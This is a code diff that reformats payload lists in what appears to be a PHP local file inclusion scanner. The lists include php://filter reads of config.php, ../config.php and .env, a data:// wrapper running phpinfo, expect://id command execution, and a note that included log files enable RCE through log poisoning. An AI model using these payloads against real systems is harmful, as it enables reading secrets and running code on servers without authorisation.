@@ -63,8 +63,16 @@ TRAVERSAL_PAYLOADS = [
 # ──────────── PHP WRAPPERS (2026 Focus) ────────────
 PHP_WRAPPER_PAYLOADS = [
     ("php://filter/convert.base64-encode/resource=index.php", "PD9w", "PHP_FILTER_B64"),
-    ("php://filter/convert.base64-encode/resource=config.php", "PD9w", "PHP_FILTER_CONFIG"),
-    ("php://filter/convert.base64-encode/resource=../config.php", "PD9w", "PHP_FILTER_PARENT"),
+    (
+        "php://filter/convert.base64-encode/resource=config.php",
+        "PD9w",
+        "PHP_FILTER_CONFIG",
+    ),
+    (
+        "php://filter/convert.base64-encode/resource=../config.php",
+        "PD9w",
+        "PHP_FILTER_PARENT",
+    ),
     ("php://filter/convert.base64-encode/resource=.env", "PD9w", "PHP_FILTER_ENV"),
     ("php://filter/read=string.rot13/resource=index.php", "<?cuc", "PHP_FILTER_ROT13"),
     # PHP filter chain RCE (2025-2026 technique)
@@ -74,7 +82,11 @@ PHP_WRAPPER_PAYLOADS = [
         "PHP_FILTER_CHAIN",
     ),
     ("php://input", "", "PHP_INPUT"),
-    ("data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==", "phpinfo", "DATA_WRAPPER"),
+    (
+        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
+        "phpinfo",
+        "DATA_WRAPPER",
+    ),
     ("expect://id", "uid=", "EXPECT_WRAPPER"),
     ("phar://test.phar/test.txt", "", "PHAR_WRAPPER"),
     ("zip://test.zip#test.txt", "", "ZIP_WRAPPER"),
@@ -160,7 +172,14 @@ def _classify_severity(method):
     if method in critical_methods:
         return "CRITICO", critical_methods[method]
 
-    log_methods = ("APACHE_ACCESS", "APACHE_ERROR", "NGINX_ACCESS", "NGINX_ERROR", "AUTH_LOG", "MAIL_LOG")
+    log_methods = (
+        "APACHE_ACCESS",
+        "APACHE_ERROR",
+        "NGINX_ACCESS",
+        "NGINX_ERROR",
+        "AUTH_LOG",
+        "MAIL_LOG",
+    )
     if method in log_methods:
         return "CRITICO", "Log file incluso — chain com log poisoning para RCE!"
 
